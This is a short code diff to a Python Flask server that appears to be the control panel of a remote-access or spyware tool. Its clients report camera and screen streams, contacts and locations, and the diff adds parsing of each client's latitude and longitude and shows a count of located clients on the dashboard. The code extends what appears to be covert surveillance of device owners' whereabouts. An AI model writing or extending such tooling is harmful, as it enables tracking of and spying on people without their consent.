@@ -43,6 +43,7 @@ class Client:
         self.file_listing_directory = None
         self.display_stream_on = False
         self.camera_stream_on = False
+        self.geolocation = None
 
     def complete_task(self, data):
         client_id = self.id.hex().upper()
@@ -131,6 +132,16 @@ def contact_callback(client_id, data):
 
 
 def location_callback(client_id, data):
+    client = clients.get(client_id)
+    data_decoded = data.decode()
+
+    lat, long = data_decoded.split(",")
+    lat = lat[lat.find(" ") + 1 :]
+    long = long[long.find(" ") + 1 :]
+
+    client.geolocation = (lat, long)
+    print_debug(client.geolocation)
+
     return save_to_disk(client_id, "location", data)
 
 
@@ -307,12 +318,20 @@ def provide_command():
 @app.route("/", methods=["GET", "POST"])
 def control_centre():
     task_count = 0
+    location_count = 0
 
     for client in clients.values():
         if client.current_task:
             task_count += 1
+        if client.geolocation:
+            location_count += 1
 
-    return render_template("index.html", clients=clients.items(), task_count=task_count)
+    return render_template(
+        "index.html",
+        clients=clients.items(),
+        task_count=task_count,
+        location_count=location_count,
+    )
 
 
 @app.route("/data", methods=["GET"])
